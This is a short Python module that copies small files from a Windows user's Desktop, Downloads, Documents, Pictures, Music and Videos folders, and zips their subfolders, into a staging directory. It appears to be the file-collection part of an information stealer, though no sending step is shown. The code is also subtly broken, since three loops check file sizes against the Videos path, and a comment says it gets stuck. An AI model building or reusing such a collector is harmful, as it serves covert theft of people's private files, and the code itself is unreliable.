import os
from shutil import make_archive, copy

def main(opdir):
    desktop_path = f"{os.environ['USERPROFILE']}\\Desktop"
    downloads_path = f"{os.environ['USERPROFILE']}\\Downloads"
    documents_path = f"{os.environ['USERPROFILE']}\\Documents"
    pictures_path = f"{os.environ['USERPROFILE']}\\Pictures"
    music_path = f"{os.environ['USERPROFILE']}\\Music"
    videos_path = f"{os.environ['USERPROFILE']}\\Videos"
    
    desktop = os.listdir(desktop_path)
    downloads = os.listdir(downloads_path)
    documents = os.listdir(documents_path)
    pictures = os.listdir(pictures_path)
    music = os.listdir(music_path)
    videos = os.listdir(videos_path)

    for file in desktop:
        if os.path.isfile(f"{desktop_path}\\{file}"):
            if os.path.getsize(f"{desktop_path}\\{file}") > 3000000:
                continue
            copy(f"{desktop_path}\\{file}", f"{opdir}\\Files\\Desktop")
        elif os.path.isdir(f"{desktop_path}\\{file}"):
            make_archive(f"{opdir}\\Files\\Desktop\\{file}", 'zip', f"{desktop_path}\\{file}")
        
    for file in downloads:
        if os.path.isfile(f"{downloads_path}\\{file}"):
            if os.path.getsize(f"{downloads_path}\\{file}") > 3000000:
                continue
            copy(f"{downloads_path}\\{file}", f"{opdir}\\Files\\Downloads")
        elif os.path.isdir(f"{downloads_path}\\{file}"):
            make_archive(f"{opdir}\\Files\\Downloads\\{file}", 'zip', f"{downloads_path}\\{file}")

    for file in documents:
        if os.path.isfile(f"{documents_path}\\{file}"):
            if os.path.getsize(f"{videos_path}\\{file}") > 3000000:
                continue
            copy(f"{documents_path}\\{file}", f"{opdir}\\Files\\Documents")
        elif os.path.isdir(f"{documents_path}\\{file}"):
            make_archive(f"{opdir}\\Files\\Documents\\{file}", 'zip', f"{documents_path}\\{file}")

    for file in pictures:
        if os.path.isfile(f"{pictures_path}\\{file}"):
            if os.path.getsize(f"{videos_path}\\{file}") > 3000000:
                continue
            copy(f"{pictures_path}\\{file}", f"{opdir}\\Files\\Pictures")
        elif os.path.isdir(f"{pictures_path}\\{file}"):
            make_archive(f"{opdir}\\Files\\Pictures\\{file}", 'zip', f"{pictures_path}\\{file}")
    
    for file in music:
        if os.path.isfile(f"{music_path}\\{file}"):
            if os.path.getsize(f"{videos_path}\\{file}") > 3000000:
                continue
            copy(f"{music_path}\\{file}", f"{opdir}\\Files\\Music")
        elif os.path.isdir(f"{music_path}\\{file}"):
            make_archive(f"{opdir}\\Files\\Music\\{file}", 'zip', f"{music_path}\\{file}")

    for file in videos:
        if os.path.isfile(f"{videos_path}\\{file}"):
            if os.path.getsize(f"{videos_path}\\{file}") > 3000000:
                continue
            copy(f"{videos_path}\\{file}", f"{opdir}\\Files\\Videos")
        elif os.path.isdir(f"{videos_path}\\{file}"):
            make_archive(f"{opdir}\\Files\\Videos\\{file}", 'zip', f"{videos_path}\\{file}")

#This needs rework, recursion and shit. just gets stuck lmao